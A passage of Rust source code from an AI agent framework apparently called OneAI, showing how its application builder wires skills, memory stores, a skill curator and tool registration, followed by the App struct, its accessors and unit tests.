                        resolver.add_provider_extra(model.to_string(), v);
                    }
                }
            }
        }

        // Resolve pricing catalog: use explicitly set catalog, or default
        let platform = self.platform.unwrap_or(Platform::current());

        // Discover skills from convention directories (.claude/skills/,
        // .agents/skills/, .opencode/skills/, .oneai/skills/ — project walked
        // up to the git root + global under home) so ecosystem skills are
        // available every session.
        self.skill_registry.load_discovered().await;

        // Domain builtin skills (general + per-domain presets + the always-on
        // `skill-creator`). Wired HERE — not by each engine entry point — so
        // every consumer of `AppBuilder::build()` gets the same skill library
        // (issue #38: the ad-hoc per-caller wiring left the FFI/c_facade and
        // uniffi paths without skills). Registered AFTER `load_discovered`,
        // preserving the established precedence that a builtin upserts over a
        // same-named discovered skill. The domain comes from the merged pack
        // name (multi-pack `"a+b"` unions both domains' builtin sets); a
        // pack-less build falls back to `"coding"` — the same default the CLI
        // commands use.
        let skill_domain_name = merged_domain_pack
            .as_ref()
            .map(|d| d.name.clone())
            .unwrap_or_else(|| "coding".to_string());
        let mut builtin_skills: Vec<oneai_core::SkillDescriptor> = Vec::new();
        for part in skill_domain_name.split('+') {
            for skill in oneai_skill::builtin::skills_for_domain(part) {
                if !builtin_skills.iter().any(|s| s.name == skill.name) {
                    builtin_skills.push(skill);
                }
            }
        }
        if let Err(e) = self.skill_registry.register_builtin(builtin_skills).await {
            tracing::warn!("failed to register builtin skills: {e}");
        }

        // Working-state store: compaction thresholds come from the domain's
        // `MemoryProfile.working_state.compaction` (CodingPack 200/50,
        // assistant 500/100) so the persistence dimension is declarative
        // per-domain, not hardcoded in the store. Precomputed here because
        // `merged_domain_pack` is moved into the `App` literal below.
        let working_state_store = self.working_state_root.as_ref().map(|root| {
            let (event_threshold, keep_recent) = merged_domain_pack
                .as_ref()
                .map(|d| {
                    let c = &d.memory_profile.working_state.compaction;
                    (c.event_threshold, c.keep_recent)
                })
                .unwrap_or((200, 50));
            std::sync::Arc::new(
                oneai_persistence::FileWorkingStateStore::new(root.clone())
                    .with_compaction(event_threshold, keep_recent),
            ) as std::sync::Arc<dyn oneai_core::traits::WorkingStateStore>
        });

        // Session event log (issue #40 trajectory replay): explicit override
        // wins; otherwise derive a file store from the working-state root so
        // the trajectory log lives beside the task event logs it complements.
        let session_event_store: Option<Arc<dyn oneai_core::traits::SessionEventStore>> =
            self.session_event_store.clone().or_else(|| {
                self.working_state_root.as_ref().map(|root| {
                    Arc::new(oneai_persistence::FileSessionEventStore::new(root.clone()))
                        as Arc<dyn oneai_core::traits::SessionEventStore>
                })
            });
        // The tap needs the bus handle after `self.engine_bus` moves into the
        // App literal below.
        let bus_for_event_tap = self.engine_bus.clone();

        // Skill lifecycle store + curator (Phase 2.1 Stage B). Built from the
        // merged pack's `skill_lifecycle` policy (CodingPack 30d/90d,
        // assistant 60d/180d) — or the `coding()` default when no pack is
        // loaded (mirrors `working_state_store`'s (200,50) fallback). Root:
        // HomeDir → `~/.oneai/curator/` (skill *usage* is a personal habit, so
        // metadata stays out of the repo); InRepo → `<working_state_root>/curator/`.
        // The store is `load()`ed and the known bundled skill names are seeded
        // `Bundled` + pinned so the always-on skill-creator is never
        // auto-archived. The curator's referenced set (cron/workflow skills)
        // starts empty — Stage B has no cron yet (Phase 3.2); `set_referenced`
        // is the refresh hook.
        let skill_policy = merged_domain_pack
            .as_ref()
            .map(|d| d.memory_profile.skill_lifecycle.clone())
            .unwrap_or_else(oneai_domain::SkillLifecyclePolicy::coding);
        let skill_config = oneai_skill::SkillLifecycleConfig {
            stale_after: skill_policy.stale_after,
            archive_after: skill_policy.archive_after,
            backup_count: skill_policy.backup_count,
            auto_transitions: skill_policy.auto_transitions,
            grace_unused: skill_policy.grace_unused,
        };
        let skill_root: std::path::PathBuf = match skill_policy.storage_root {
            oneai_domain::StorageRoot::HomeDir => dirs::home_dir()
                .unwrap_or_else(|| std::path::PathBuf::from("/tmp"))
                .join(".oneai")
                .join("curator"),
            // InRepo (and any future variant) → under the working-state root
            // so metadata is co-located with task state.
            _ => self
                .working_state_root
                .clone()
                .unwrap_or_else(|| std::path::PathBuf::from(".oneai"))
                .join("curator"),
        };
        let skill_metadata_store = std::sync::Arc::new(oneai_skill::SkillMetadataStore::new(
            skill_root,
            skill_config,
        ));
        skill_metadata_store.load().await;
        // Seed bundled skills (always-on skill-creator + presets) as Bundled +
        // pinned so they're exempt from auto-retirement — but only on first
        // sight, so a user's deliberate unpin survives a rebuild.
        let now = oneai_skill::lifecycle::now_unix();
        let bundled_names: Vec<&str> = oneai_skill::builtin::builtin_skill_names();
        skill_metadata_store.seed_bundled(&bundled_names, now).await;
        let skill_curator = std::sync::Arc::new(oneai_skill::SkillCurator::new(
            std::sync::Arc::clone(&self.skill_registry),
            std::sync::Arc::clone(&skill_metadata_store),
            std::collections::HashSet::new(),
        ));
        let skill_metadata_store = Some(skill_metadata_store);
        let skill_curator = Some(skill_curator);

        // Shared, session-scoped background-task registry (carries the tasks
        // map + the completion sink + the bus for cancel/progress emission).
        // Built alongside (and only when) `engine_bus` is set — background
        // delegation is bus-gated. The shared sink re-activates the parent on
        // normal completion AND on cancel (so the parent perceives a
        // cancelled task).
        let background_registry = self.engine_bus.as_ref().map(|b| {
            let sink: Arc<dyn oneai_agent::BackgroundCompletionSink> =
                Arc::new(crate::session::BusBackgroundSink::shared(b.clone()));
            Arc::new(oneai_agent::BackgroundTaskRegistry::new(
                Some(b.clone() as Arc<dyn oneai_bus::EngineBus>),
                sink,
            ))
        });

        let app = App {
            provider,
            tool_registry: self.tool_registry,
            tool_executor,
            interaction_gate,
            permission_audit_log: self.permission_audit_log.clone(),
            engine_bus: self.engine_bus,
            background_registry,
            parser,
            memory_manager,
            rag_index: self.rag_index,
            skill_selector: self.skill_selector.unwrap_or_else(|| {
                Arc::new(SkillSelector::with_embedding_service(
                    SelectionMode::Hybrid,
                    3,
                    embedding_service.clone(),
                ))
            }),
            skill_registry: self.skill_registry,
            active_skill: Arc::new(tokio::sync::RwLock::new(None)),
            persistence: self.persistence,
            workflow_executor,
            platform,
            trace_context: self.trace_context,
            #[cfg(feature = "otel")]
            metrics_provider: self.metrics_provider,
            domain_pack: merged_domain_pack,
            a2a_client: self.a2a_client,
            wasm_runtime: self.wasm_runtime,
            wasm_module_manager,
            wasm_module_registry,
            wasm_resource_monitor,
            mcp_plugin_registry,
            mcp_server_host,
            a2a_server_host,
            data_layer_reloader: Some(data_layer_reloader),
            sqlite_store: self.sqlite_store,
            embedding_service,
            usage_tracker,
            rate_limiter,
            circuit_breaker,
            provider_pool,
            smart_router: resolved_smart_router,
            token_counter: resolved_token_counter,
            context_manager: resolved_context_manager,
            model_context_resolver: resolved_resolver,
            probe_context_windows: self.probe_context_windows,
            generation_config: self.generation_config,
            thinking_effort: self.thinking_effort,
            constrained_output_policy: self.constrained_output_policy,
            reflection_cadence: self.reflection_cadence,
            working_state_store,
            session_event_store,
            skill_metadata_store,
            skill_curator,
            cron_scheduler: self.cron_scheduler,
            terminal_backend: self.terminal_backend,
        };

        // Spawn the session-event tap (issue #40): persist trajectory-relevant
        // yields per session so a historical session can replay its timeline.
        // Bus-gated like everything event-stream-shaped.
        if let (Some(bus), Some(store)) = (bus_for_event_tap, app.session_event_store.clone()) {
            crate::session_event_log::spawn_session_event_tap(bus, store);
        }

        // Skill tools (issue #38): the injected Tier1 skill menu tells the
        // model to "call the `skill` tool" — registering the tool here (not
        // per entry point) guarantees menu and tool always come as a pair on
        // EVERY path that builds an App (CLI run/TUI, `serve`, `app-server`
        // sidecar, FFI c_facade, uniffi mobile). Idempotent — registration is
        // an upsert by tool name, so a caller invoking `register_skill_tools`
        // again only replaces the same instances.
        if let Err(e) = app.register_skill_tools().await {
            tracing::warn!("failed to register skill tools: {e}");
        }

        Ok(app)
    }
}

impl Default for AppBuilder {
    fn default() -> Self {
        Self::new()
    }
}

/// A fully assembled OneAI application.
pub struct App {
    /// LLM provider (optional).
    pub provider: Option<Arc<dyn LlmProvider>>,
    /// Tool registry.
    pub tool_registry: Arc<ToolRegistry>,
    /// Tool executor (registry + approval gate).
    pub tool_executor: Arc<ToolExecutor>,
    /// Unified interaction gate — every loop-suspend decision point.
    pub interaction_gate: Arc<dyn InteractionGate>,
    /// Permission-decision audit log (gap-analysis P1 #9) — cloned into each
    /// AgentLoop the session spawns. `None` = no audit trail.
    pub permission_audit_log: Option<Arc<dyn oneai_core::audit::PermissionAuditLog>>,
    /// Engine bus (when `AppBuilder::engine_bus` was called). `None` for
    /// non-bus (direct-drive) apps; `Some` lets `AppSession::run_turn_via_bus`
    /// emit `EngineYield`s and means `interaction_gate` is a `BusInteractionGate`.
    pub engine_bus: Option<Arc<oneai_bus::InProcessBus>>,
    /// Shared, session-scoped background-task registry (Phase 2A gap-1 fix).
    /// `Some` whenever `engine_bus` is `Some` (background delegation is
    /// bus-gated); each per-turn `AsyncTaskRunner` borrows it so spawned
    /// tasks survive the delegating turn's end and a cross-turn `cancel`
    /// (via the `background/*` RPC reaching this registry) reaches them.
    /// `None` for non-bus (direct-drive) apps.
    pub background_registry: Option<Arc<oneai_agent::BackgroundTaskRegistry>>,
    /// Output parser.
    pub parser: Arc<dyn OutputParser>,
    /// Memory manager.
    pub memory_manager: Arc<MemoryManager>,
    /// RAG document index (optional).
    pub rag_index: Option<Arc<DocumentIndex>>,
    /// Skill selector.
    pub skill_selector: Arc<SkillSelector>,
    /// Shared skill registry — read by the AgentLoop (skill menu) and the
    /// `skill` tool (on-demand prompt loading). Mutated via `/skill` commands
    /// (register/remove/activate) and on domain switch.
    pub skill_registry: Arc<oneai_skill::SkillRegistry>,
    /// Manually-activated skill name (via `/skill <name>`). When set, its full
    /// `prompt_template` is injected as a system message on every agent run.
    /// Shared across the session so the TUI can change it between runs.
    pub active_skill: Arc<tokio::sync::RwLock<Option<String>>>,
    /// Persistence (optional).
    pub persistence: Option<Arc<FilePersistence>>,
    /// Workflow executor.
    pub workflow_executor: Arc<WorkflowExecutor>,
    /// Platform (detected or overridden).
    pub platform: Platform,
    /// Trace context (optional — for trajectory logging).
    pub trace_context: Option<TraceContext>,
    /// OTEL metrics provider (only when `otel` feature on). Wired into the
    /// AgentLoop config by AppSession.
    #[cfg(feature = "otel")]
    pub metrics_provider: Option<Arc<oneai_trace::OtelMetricsProvider>>,
    /// Domain pack (optional — for domain-specific configuration).
    pub domain_pack: Option<Arc<MergedDomainPack>>,
    /// A2A client (optional — for inter-agent communication).
    pub a2a_client: Option<Arc<A2AClient>>,
    /// WASM runtime (optional — for sandboxed tool execution).
    pub wasm_runtime: Option<Arc<WasmRuntime>>,
    /// WASM module manager (optional — for WASM module lifecycle).
    pub wasm_module_manager: Option<WasmModuleManager>,
    /// WASM module registry (optional — for named module lifecycle management).
    pub wasm_module_registry: Option<WasmModuleRegistry>,
    /// WASM resource monitor (optional — for execution metrics tracking).
    pub wasm_resource_monitor: Option<Arc<WasmResourceMonitor>>,
    /// MCP plugin registry (optional — for MCP server management). Shared via
    /// `Arc` so the data-layer reloader can re-register tools from it.
    pub mcp_plugin_registry: Option<Arc<McpPluginRegistry>>,
    /// MCP server host (optional — for serving tools via MCP protocol).
    pub mcp_server_host: Option<McpServerHost>,
    /// A2A server host (optional — for serving agent capabilities via A2A protocol).
    pub a2a_server_host: Option<A2AServerHost>,
    /// Data-layer reloader (evolution-plan §3.4) — backs the `reload` tool.
    /// `None` only when the user explicitly suppressed it; otherwise the
    /// standard `AppDataLayerReloader` (skills + MCP) is constructed in
    /// `build()`.
    pub data_layer_reloader: Option<Arc<dyn oneai_core::traits::DataLayerReloader>>,
    /// SQLite session store (for memory + conversation persistence).
    pub sqlite_store: Option<Arc<SqliteSessionStore>>,
    /// Embedding service (optional — for auto-embedding RAG and memory search).
    pub embedding_service: Option<Arc<dyn EmbeddingService>>,
    /// Usage tracker (optional — for tracking LLM inference token usage).
    pub usage_tracker: Option<Arc<dyn UsageTracker>>,
    /// Rate limiter (optional — for provider API rate limiting).
    pub rate_limiter: Option<Arc<dyn RateLimiter>>,
    /// Circuit breaker (optional — for provider failover).
    pub circuit_breaker: Option<Arc<dyn CircuitBreaker>>,
    /// Provider pool (optional — for multi-provider fallback orchestration).
    pub provider_pool: Option<Arc<ProviderPool>>,
    /// Smart router for intelligent model selection.
    pub smart_router: Option<Arc<SmartRouter>>,
    /// Token counter for accurate token counting.
    pub token_counter: Option<Arc<dyn TokenCounter>>,
    /// Context manager for model-aware context trimming.
    pub context_manager: Option<Arc<ContextManager>>,
    /// 3-layer model context resolver (L1 user > L2 provider probe > L3 builtin).
    pub model_context_resolver: Option<Arc<oneai_core::ModelContextResolver>>,
    /// Whether to probe the provider for context windows at warm-up.
    pub probe_context_windows: bool,
    /// Sampling / generation parameters — propagated into the `AgentLoopConfig`
    /// of every agent run (main loop, workflow nodes, sub-agents inherit via
    /// the parent). See `AppBuilder::generation_config`.
    pub generation_config: oneai_core::GenerationConfig,
    /// Persisted thinking-effort selection — the web UI "思考程度" toggle.
    /// `AppSession` reads it each turn (main agent) and the
    /// `DefaultSubAgentFactory` reads it per sub-agent (capped per kind).
    /// `None` = no store wired (legacy path; engine falls back to defaults).
    pub thinking_effort: Option<Arc<dyn oneai_core::ThinkingEffortStore>>,
    /// Layer-1 constrained-decoding policy — propagated into every `AgentLoopConfig`.
    /// See `AppBuilder::constrained_output_policy`.
    pub constrained_output_policy: oneai_core::ConstrainedOutputPolicy,
    /// Reflect sub-agent cadence (Phase 2.1 Stage A) — `None` = off. See
    /// `AppBuilder::reflection_cadence`.
    pub reflection_cadence: Option<usize>,
    /// Durable working-state store (optional) — the cross-session source of
    /// truth for goal/steps/decisions/blockers, persisted as per-task append-only
    /// event logs. When set, the agent loop persists plan progress incrementally
    /// (so it survives crashes) and a brand-new session can discover and
    /// continue an unfinished task from a previous session. See
    /// `AppBuilder::working_state`.
    pub working_state_store: Option<Arc<dyn oneai_core::traits::WorkingStateStore>>,
    /// Per-session bus-event log (issue #40 trajectory replay) — tap-fed at
    /// build time when an engine bus is wired. Read path: the
    /// `session/trajectory` RPC (via `AppProbe`) replays a historical
    /// session's timeline. `None` when neither an override nor a
    /// working-state root was configured.
    pub session_event_store: Option<Arc<dyn oneai_core::traits::SessionEventStore>>,
    /// Skill lifecycle metadata store (Phase 2.1 Stage B) — the durable
    /// per-skill `use_count` / `state` / `pinned` index + backup snapshots.
    /// `None` when no DomainPack is loaded (no `skill_lifecycle` policy).
    /// Threaded into the AgentLoop (menu hides Archived skills) and the
    /// `skill` / `skill_manage` tools.
    pub skill_metadata_store: Option<Arc<oneai_skill::SkillMetadataStore>>,
    /// Skill curator (Phase 2.1 Stage B) — runs the automatic
    /// `Active → Stale → Archived` retirement, writes restorable backups,
    /// and backs the `skill_manage` tool + `oneai curator` CLI.
    pub skill_curator: Option<Arc<oneai_skill::SkillCurator>>,
    /// Durable cron scheduler (Phase 3.2) — held for future agent-tool
    /// queries; lifecycle driven by the CLI. See `AppBuilder::cron_provider`.
    pub cron_scheduler: Option<Arc<dyn oneai_core::traits::CronScheduler>>,
    /// Terminal backend (Phase 3.3) — app-level handle for out-of-band
    /// lifecycle (`oneai terminal exec/snapshot/restore/cleanup`). See
    /// `AppBuilder::terminal_backend`. `ShellTool` owns its own backend.
    pub terminal_backend: Option<Arc<dyn oneai_tool::TerminalBackend>>,
}

impl App {
    /// Create a new agent session.
    pub fn create_session(&self) -> AppSession {
        AppSession::new(self)
    }

    /// Create (or resume) a session bound to an existing conversation id.
    ///
    /// If SQLite persistence is enabled and a conversation with this id is
    /// saved, its message history is loaded back into the new session so the
    /// chat can continue where it left off. If no saved conversation exists,
    /// an empty conversation with this id is created (the caller may have just
    /// minted the id for a brand-new chat — subsequent `run_agent` calls will
    /// auto-save it under the same id).
    pub async fn create_session_with_id(&self, id: &str) -> AppSession {
        let conversation = match &self.sqlite_store {
            Some(store) => match store.load_conversation(id).await {
                Ok(Some(conv)) => conv,
                _ => Conversation::with_id(id.to_string()),
            },
            None => Conversation::with_id(id.to_string()),
        };
        AppSession::new_with_conversation(self, conversation)
    }

    /// List all saved conversations (metadata only — id, timestamps, message
    /// count). Returns an empty vec when SQLite persistence is not enabled.
    pub async fn list_conversations(&self) -> Vec<SessionInfo> {
        match &self.sqlite_store {
            Some(store) => store.list_conversations().await.unwrap_or_default(),
            None => Vec::new(),
        }
    }

    /// Delete a saved conversation (and its STM entries) by id. No-op (Ok)
    /// when SQLite persistence is not enabled.
    pub async fn delete_conversation(&self, id: &str) -> Result<()> {
        match &self.sqlite_store {
            Some(store) => store.delete_conversation(id).await,
            None => Ok(()),
        }
    }

    /// Rename a saved conversation's title (§W4 #10). Persists the new title to
    /// both the `title` column and `metadata["title"]` (the override channel a
    /// subsequent `save_conversation` honors, so the rename survives the next
    /// turn). An empty/whitespace title is a no-op. No-op (Ok) when SQLite
    /// persistence is not enabled; errors when no saved session matches `id`.
    pub async fn rename_conversation(&self, id: &str, title: &str) -> Result<()> {
        match &self.sqlite_store {
            Some(store) => store.rename_conversation(id, title).await,
            None => Ok(()),
        }
    }

    /// Toggle a saved conversation's archived flag (§W4 #10). Archived sessions
    /// fold into a collapsed sidebar group. No-op (Ok) when SQLite persistence
    /// is not enabled; errors when no saved session matches `id`.
    pub async fn set_conversation_archived(&self, id: &str, archived: bool) -> Result<()> {
        match &self.sqlite_store {
            Some(store) => store.set_conversation_archived(id, archived).await,
            None => Ok(()),
        }
    }

    /// Record one per-message feedback entry (§W4). Best-effort no-op when
    /// SQLite persistence is not enabled or the write fails — feedback is
    /// non-critical UX state, never a turn failure.
    pub async fn record_feedback(
        &self,
        session_id: &str,
        turn_id: &str,
        message_role: &str,
        kind: &str,
        text: Option<&str>,
    ) {
        if let Some(store) = &self.sqlite_store {
            store
                .record_feedback(session_id, turn_id, message_role, kind, text)
                .await;
        }
    }

    /// All feedback entries for `session_id` (§W4). Empty when persistence is
    /// not enabled or the read fails — never panics.
    pub async fn list_feedback(&self, session_id: &str) -> Vec<oneai_core::FeedbackEntry> {
        match &self.sqlite_store {
            Some(store) => store.list_feedback(session_id).await,
            None => Vec::new(),
        }
    }

    /// Register a tool — adds it to both the tool executor and workflow executor.
    pub async fn register_tool(&self, tool: Arc<dyn Tool>) -> Result<()> {
        self.tool_registry.register(tool.clone()).await?;
        self.workflow_executor.register_tool(tool).await;
        Ok(())
    }

    /// Register the skill tools (Phase 2.1 Stage B): the `skill` tool
    /// (progressive disclosure + use-count bumping + archive gate) and, when a
    /// curator is present, the `skill_manage` tool (model-driven lifecycle
    /// control).
    ///
    /// Called automatically by `AppBuilder::build()` (issue #38 — every engine
    /// path gets the tools the injected skill menu refers to); exposed publicly
    /// for bespoke wiring. Idempotent: both registrations upsert by tool name.
    pub async fn register_skill_tools(&self) -> Result<()> {
        let skill_tool = match &self.skill_metadata_store {
            Some(store) => oneai_agent::SkillTool::new(self.skill_registry.clone())
                .with_metadata_store(store.clone()),
            None => oneai_agent::SkillTool::new(self.skill_registry.clone()),
        };
        self.register_tool(std::sync::Arc::new(skill_tool)).await?;
        if let Some(curator) = &self.skill_curator {
            self.register_tool(std::sync::Arc::new(oneai_agent::SkillManageTool::new(
                curator.clone(),
            )))
            .await?;
        }
        Ok(())
    }

    /// Register all tools from the domain pack.
    ///
    /// This is called automatically after build() when domain packs are configured.
    /// It registers domain tools and applies tool decorators.
    pub async fn register_domain_tools(&self) -> Result<()> {
        if let Some(domain) = &self.domain_pack {
            for tool in &domain.tools {
                self.register_tool(tool.clone()).await?;
            }
        }
        Ok(())
    }

    /// Check if a provider is configured.
    pub fn has_provider(&self) -> bool {
        self.provider.is_some()
    }

    /// Get the tool executor.
    pub fn tool_executor(&self) -> &Arc<ToolExecutor> {
        &self.tool_executor
    }

    /// Get the memory manager.
    pub fn memory_manager(&self) -> &Arc<MemoryManager> {
        &self.memory_manager
    }

    /// Get the RAG index.
    pub fn rag_index(&self) -> Option<&Arc<DocumentIndex>> {
        self.rag_index.as_ref()
    }

    /// Get the persistence.
    pub fn persistence(&self) -> Option<&Arc<FilePersistence>> {
        self.persistence.as_ref()
    }

    /// Get the platform.
    pub fn platform(&self) -> &Platform {
        &self.platform
    }

    /// Get the trace context (for trajectory logging).
    pub fn trace_context(&self) -> Option<&TraceContext> {
        self.trace_context.as_ref()
    }

    /// Get the domain pack.
    pub fn domain_pack(&self) -> Option<&Arc<MergedDomainPack>> {
        self.domain_pack.as_ref()
    }

    /// Get the A2A client (for inter-agent communication).
    pub fn a2a_client(&self) -> Option<&Arc<A2AClient>> {
        self.a2a_client.as_ref()
    }

    /// Get the WASM runtime (for sandboxed tool execution).
    pub fn wasm_runtime(&self) -> Option<&Arc<WasmRuntime>> {
        self.wasm_runtime.as_ref()
    }

    /// Get the WASM module manager (for WASM module lifecycle).
    pub fn wasm_module_manager(&self) -> Option<&WasmModuleManager> {
        self.wasm_module_manager.as_ref()
    }

    /// Get the WASM module registry (for named module lifecycle management).
    pub fn wasm_module_registry(&self) -> Option<&WasmModuleRegistry> {
        self.wasm_module_registry.as_ref()
    }

    /// Get the WASM resource monitor (for execution metrics tracking).
    pub fn wasm_resource_monitor(&self) -> Option<&Arc<WasmResourceMonitor>> {
        self.wasm_resource_monitor.as_ref()
    }

    /// Get the MCP plugin registry (for MCP server management).
    pub fn mcp_plugin_registry(&self) -> Option<&McpPluginRegistry> {
        self.mcp_plugin_registry.as_deref()
    }

    /// Get the data-layer reloader backing the `reload` tool
    /// (evolution-plan §3.4). `None` only when explicitly suppressed.
    pub fn data_layer_reloader(&self) -> Option<&Arc<dyn oneai_core::traits::DataLayerReloader>> {
        self.data_layer_reloader.as_ref()
    }

    /// Get the MCP server host (for serving tools via MCP protocol).
    pub fn mcp_server_host(&self) -> Option<&McpServerHost> {
        self.mcp_server_host.as_ref()
    }

    /// Get the A2A server host (for serving agent capabilities via A2A protocol).
    pub fn a2a_server_host(&self) -> Option<&A2AServerHost> {
        self.a2a_server_host.as_ref()
    }

    /// Get the embedding service (for auto-embedding RAG and memory search).
    pub fn embedding_service(&self) -> Option<&Arc<dyn EmbeddingService>> {
        self.embedding_service.as_ref()
    }

    /// Get the usage tracker (for token-usage tracking).
    pub fn usage_tracker(&self) -> Option<&Arc<dyn UsageTracker>> {
        self.usage_tracker.as_ref()
    }

    /// Get the rate limiter (for provider API rate limiting).
    pub fn rate_limiter(&self) -> Option<&Arc<dyn RateLimiter>> {
        self.rate_limiter.as_ref()
    }

    /// Get the circuit breaker (for provider failover).
    pub fn circuit_breaker(&self) -> Option<&Arc<dyn CircuitBreaker>> {
        self.circuit_breaker.as_ref()
    }

    /// Get the provider pool (for multi-provider fallback orchestration).
    pub fn provider_pool(&self) -> Option<&Arc<ProviderPool>> {
        self.provider_pool.as_ref()
    }

    /// Get the smart router (if configured).
    pub fn smart_router(&self) -> Option<&Arc<SmartRouter>> {
        self.smart_router.as_ref()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use oneai_core::platform::PlatformAdapter;
    use oneai_tool::CalculatorTool;

    /// Issue #38: skill wiring lives in `AppBuilder::build()`, not in each
    /// engine entry point. A bare build must register the builtin skills AND
    /// the `skill` / `skill_manage` tools the injected skill menu refers to —
    /// so the CLI, the sidecar (`serve` / `app-server`), the FFI c_facade and
    /// the uniffi mobile path all get the same skill library for free.
    #[tokio::test]
    async fn test_build_wires_skills_and_skill_tools() {
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .build()
            .await
            .expect("Build should succeed");

        // Builtin skills present — the always-on skill-creator plus the
        // coding presets (pack-less builds fall back to the coding domain).
        assert!(app
            .skill_registry
            .find_by_name("skill-creator")
            .await
            .is_some());
        assert!(
            app.skill_registry
                .find_by_name("code-review")
                .await
                .is_some(),
            "coding builtin skills must be wired by build()"
        );

        // The tools the skill menu tells the model to call are registered.
        let tool_names = app.tool_executor().list_tools().await;
        assert!(tool_names.contains(&"skill".to_string()));
        assert!(tool_names.contains(&"skill_manage".to_string()));
    }

    /// Issue #38: the builtin skill set follows the domain pack — a research
    /// pack gets the research presets, and a multi-pack merge (name `a+b`)
    /// unions both domains' builtin skills. `$HOME` is pointed at an empty
    /// dir for the duration so convention-directory discovery contributes
    /// nothing and the assertions see only the builtin wiring (a dev machine
    /// with skills in `~/.oneai/skills` would otherwise leak into the test).
    #[tokio::test]
    async fn test_build_builtin_skills_follow_domain_pack() {
        let tmp_home =
            std::env::temp_dir().join(format!("oneai-builder-home-{}", std::process::id()));
        std::fs::create_dir_all(&tmp_home).unwrap();
        let prev_home = std::env::var("HOME").ok();
        std::env::set_var("HOME", &tmp_home);

        let app = AppBuilder::new()
            .noop_interaction_gate()
            .domain_pack(oneai_domain::research_pack("."))
            .build()
            .await
            .expect("Build should succeed");
        let names = app.skill_registry.skill_names().await;
        assert!(
            names.iter().any(|n| n == "deep-research"),
            "research pack must wire research builtin skills: {names:?}"
        );
        assert!(names.iter().any(|n| n == "skill-creator"));
        assert!(
            !names.iter().any(|n| n == "code-review"),
            "research pack must not wire coding builtin skills: {names:?}"
        );

        let app = AppBuilder::new()
            .noop_interaction_gate()
            .domain_pack(oneai_domain::coding_pack("."))
            .domain_pack(oneai_domain::research_pack("."))
            .build()
            .await
            .expect("Build should succeed");
        let names = app.skill_registry.skill_names().await;
        assert!(
            names.iter().any(|n| n == "code-review"),
            "multi-pack merge must union coding skills: {names:?}"
        );
        assert!(
            names.iter().any(|n| n == "deep-research"),
            "multi-pack merge must union research skills: {names:?}"
        );

        // Restore $HOME for other tests in this process.
        match prev_home {
            Some(h) => std::env::set_var("HOME", h),
            None => std::env::remove_var("HOME"),
        }
        let _ = std::fs::remove_dir_all(&tmp_home);
    }

    #[tokio::test]
    async fn test_app_builder_default_build() {
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .default_parser()
            .build()
            .await
            .expect("Build should succeed");

        assert!(!app.has_provider()); // No provider set
                                      // Self-managed memory tools are registered by DEFAULT for every build
                                      // (issue #12) — per-turn model-driven memory capture is a default
                                      // mechanism, not a domain opt-in. A bare builder with no domain pack,
                                      // provider, or persistence still hands the model the capture/recall
                                      // tools (in-memory until sqlite_persistence is wired).
        let tool_names = app.tool_executor().list_tools().await;
        assert!(tool_names.contains(&"core_memory_edit".to_string()));
        assert!(tool_names.contains(&"memory_search".to_string()));
        assert!(tool_names.contains(&"archival_memory_insert".to_string()));
    }

    #[tokio::test]
    async fn test_app_register_and_use_tool() {
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .build()
            .await
            .expect("Build should succeed");

        app.register_tool(Arc::new(CalculatorTool::new()))
            .await
            .unwrap();

        let session = app.create_session();

        // Execute calculator via session
        let result = session
            .execute_tool("calculator", serde_json::json!({"expression": "2+3"}))
            .await
            .unwrap();
        assert!(result.success);
        assert_eq!(result.content, "5");
    }

    #[tokio::test]
    async fn test_app_session_memory() {
        let app = AppBuilder::new()
            .noop_interaction_gate()
            .build()
            .await
            .expect("Build should succeed");

        let session = app.create_session();

        // The canonical long-term memory is now the fact_archive (M1: working
        // memory is single-sourced on the Conversation, so sending a user
        // message no longer round-trips through STM). Insert a fact into the
        // archival tier and verify retrieve_memory recalls it via recall_facts.
        let fact = oneai_core::MemoryFact {
            id: "f1".to_string(),
            user_id: String::new(),
            session_id: String::new(),
            fact_type: oneai_core::FactType::new("decision"),
            subject: "lang".to_string(),
            predicate: "is".to_string(),
            content: "Rust is a programming language".to_string(),
            embedding: None,
            metadata: std::collections::HashMap::new(),
            importance: 0.5,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
            version: 1,
            superseded: false,
            superseded_at: None,
            pinned: false,
        };
        session.memory_manager().archive_facts(vec![fact]).await;

        // Retrieve from memory (recall_facts → fact_archive three-factor search).
        let results = session.retrieve_memory("programming", 5).await.unwrap();
        assert!(!results.is_empty());
        assert!(results[0].content.contains("Rust"));
    }

    #[tokio::test]
    async fn test_app_blocking_gate() {
        let app = AppBuilder::new()
            .interaction_gate(Arc::new(oneai_tool::DenyAllInteractionGate))
            .build()
            .await
            .expect("Build should succeed");

        app.register_tool(Arc::new(oneai_tool::ShellTool::new()))
            .await
            .unwrap();

        let session = app.create_session();

        // Shell is high-risk — should be denied by the deny-all gate
        let result = session
            .execute_tool("shell", serde_json::json!({"command": "echo test"}))
            .await
            .unwrap();
        assert!(!result.success);
        assert!(result.error.as_ref().unwrap().contains("denied"));
    }

    #[tokio::test]
    async fn test_app_with_persistence() {
        let tmp_dir = tempfile::TempDir::new().unwrap();
        let persistence = Arc::new(FilePersistence::new(tmp_dir.path().to_str().unwrap()));

        let app = AppBuilder::new()
            .noop_interaction_gate()
            .persistence(persistence)
            .build()
            .await
            .expect("Build should succeed");

        // Persistence is wired at the App level (used by Studio's checkpoint
        // browser); the per-session working-state event log (FileWorkingStateStore)
        // is the durable substrate for task continuation, not full-state snapshots.
        let _session = app.create_session();
    }

    #[tokio::test]
    async fn test_app_platform_interaction_gate() {
        // Test building an App with a platform interaction gate (stub) via a
        // PlatformAdapter — the adapter bundles the gate + detected platform.
        let app = AppBuilder::new()
            .platform_adapter(PlatformAdapter::macos_stub())
            .build()
            .await
            .expect("Build should succeed");

        // Stub auto-proceeds (every point disabled), so tools should work
        app.register_tool(Arc::new(CalculatorTool::new()))
            .await
            .unwrap();
        let session = app.create_session();

        let result = session
            .execute_tool("calculator", serde_json::json!({"expression": "2+2"}))
            .await
            .unwrap();
        assert!(result.success);
        assert_eq!(result.content, "4");

        // Platform should be set by the adapter
        assert!(matches!(
            app.platform(),
            Platform::Macos | Platform::Linux | Platform::Windows
        ));
    }

    #[tokio::test]
    async fn test_app_platform_adapter() {
        // Test building an App with a PlatformAdapter
        let adapter = PlatformAdapter::android_stub();
        let app = AppBuilder::new()
            .platform_adapter(adapter)
            .build()
            .await
